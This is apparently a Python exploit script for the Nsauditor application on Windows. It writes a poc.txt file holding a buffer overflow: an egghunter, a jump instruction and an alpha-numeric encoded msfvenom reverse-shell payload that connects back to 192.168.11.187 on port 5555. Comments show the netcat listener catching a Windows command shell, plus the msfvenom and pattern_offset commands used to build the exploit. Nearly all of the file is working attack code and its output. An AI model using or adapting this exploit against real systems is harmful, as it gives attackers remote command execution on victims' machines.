#!/usr/bin/env python
# author: Win Sam 
# description: Crash with 20000 bytes

#root@kali:/var/www/html# nc -nvlp 5555
#listening on [any] 5555 ...
#connect to [192.168.11.187] from (UNKNOWN) [192.168.11.186] 49243
#Microsoft Windows [Version 6.0.6000]
#Copyright (c) 2006 Microsoft Corporation.  All rights reserved.
#
#C:\Program Files\Nsauditor>ipconfig
#ipconfig
#
#Windows IP Configuration
#
#
#Ethernet adapter Bluetooth Network Connection:
#
#   Media State . . . . . . . . . . . : Media disconnected
#   Connection-specific DNS Suffix  . : 
#
#Ethernet adapter Local Area Connection:
#
#   Connection-specific DNS Suffix  . : localdomain
#   Link-local IPv6 Address . . . . . : fe80::48d6:43fc:1c42:e8e1%8
#   IPv4 Address. . . . . . . . . . . : 192.168.11.186
#   Subnet Mask . . . . . . . . . . . : 255.255.255.0
#   Default Gateway . . . . . . . . . : 192.168.11.2
#
#Tunnel adapter Local Area Connection* 7:
#
#   Connection-specific DNS Suffix  . : localdomain
#   Link-local IPv6 Address . . . . . : fe80::5efe:192.168.11.186%11
#   Default Gateway . . . . . . . . . : 
#
#Tunnel adapter Local Area Connection* 9:
#
#   Media State . . . . . . . . . . . : Media disconnected
#   Connection-specific DNS Suffix  . : 
#
#C:\Program Files\Nsauditor>



#root@kali:/var/www/html# /usr/bin/msf-pattern_offset -q 73473673
#[*] Exact match at offset 5239

egghunter="\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x57\x30\x30\x54\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

#0068A76A  |> 5F             POP EDI
#0068A76B  |. 5D             POP EBP
#0068A76C  \. C3             RETN
# + "D" * (20000-5239-4)
place="\xE9\xCA\xEB\xFF\xFF" + "C" * (60-5)
#0012EA44  ^E9 D1EBFFFF      JMP 0012D61A


#root@kali:~# msfvenom -p windows/shell_reverse_tcp lhost=192.168.11.187 lport=5555 -e x86/alpha_mixed BufferRegister=EAX
#[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
#[-] No arch selected, selecting arch: x86 from the payload
#Found 1 compatible encoders
#Attempting to encode payload with 1 iterations of x86/alpha_mixed
#x86/alpha_mixed succeeded with size 702 (iteration=0)
#x86/alpha_mixed chosen with final size 702
#Payload size: 702 bytes
#PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlJHK2Gpwpwpu0K99uUayPe4nkrp6PlKF2vlnkCbdTNkBRGXvomgQZ4fp1KOnLulCQ1lTBdlgPiQjo4Mc1IWKRhr2r2wLKbrB0LKbjElNkbltQcHYsW8gqzqf1lKSiUp31jsnkriFxXcwJrilKUdnk5QkfdqKONLjaZodM6ao75hYpqeZV33QmhxukcMEtbUxdaHnkV8a4wq9Ce6lKflrklKSheLVa8SNkC4lKFaJpK9aTWTGTaK1KSQ1IQJsaYoypqOsosjlKeBxklM1MCXP3fR7pgpe8rWRSgB1Of4QxRl0wdfdGYoiElxNp5Qc0GpwY8D3drpphuyopRKs0kOn5pPRpRpf0qP601P600hHjfoyO9pkOKez7SZDE2HYPLhTKmkQxc2s0vunSMYm6qzr0f61GbHJ9Let41qkOkeMUiPptTLKOBnc845xlU8hpnUMr0VyozucXqs0mpdUPoykS67bwpWP1l6QzdRF966yrYmE6hGrdEtulc1s1lMrd4dtP8FePw4aD0Prvbv3fqVcfRnCfCf630VRHaiJl7OLFYozuMYYpPN3fw6iop0QxEXOwGmsPioZuoK8pMeMrcfbHmvLUoMmM9on5eltFSL5ZMPkK9prUTEMk0GB3SBBOrJ5Pv3YoZuAA

payload ="PYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIYlJHK2Gpwpwpu0K99uUayPe4nkrp6PlKF2vlnkCbdTNkBRGXvomgQZ4fp1KOnLulCQ1lTBdlgPiQjo4Mc1IWKRhr2r2wLKbrB0LKbjElNkbltQcHYsW8gqzqf1lKSiUp31jsnkriFxXcwJrilKUdnk5QkfdqKONLjaZodM6ao75hYpqeZV33QmhxukcMEtbUxdaHnkV8a4wq9Ce6lKflrklKSheLVa8SNkC4lKFaJpK9aTWTGTaK1KSQ1IQJsaYoypqOsosjlKeBxklM1MCXP3fR7pgpe8rWRSgB1Of4QxRl0wdfdGYoiElxNp5Qc0GpwY8D3drpphuyopRKs0kOn5pPRpRpf0qP601P600hHjfoyO9pkOKez7SZDE2HYPLhTKmkQxc2s0vunSMYm6qzr0f61GbHJ9Let41qkOkeMUiPptTLKOBnc845xlU8hpnUMr0VyozucXqs0mpdUPoykS67bwpWP1l6QzdRF966yrYmE6hGrdEtulc1s1lMrd4dtP8FePw4aD0Prvbv3fqVcfRnCfCf630VRHaiJl7OLFYozuMYYpPN3fw6iop0QxEXOwGmsPioZuoK8pMeMrcfbHmvLUoMmM9on5eltFSL5ZMPkK9prUTEMk0GB3SBBOrJ5Pv3YoZuAA"
buffer= "A" * 6 + "\x54\x58\x2D\x55\x55\x55\x55\x2D\x55\x55\x55\x55\x2D\xFE\x40\x55\x55" + payload + "B" * (5235-6-len(place)-len(payload)-17) + place + "\xeb\xc2\x41\x41" + "\x6A\xA7\x68"

f= open("poc.txt","w") 
f.write(buffer) 
f.close() 
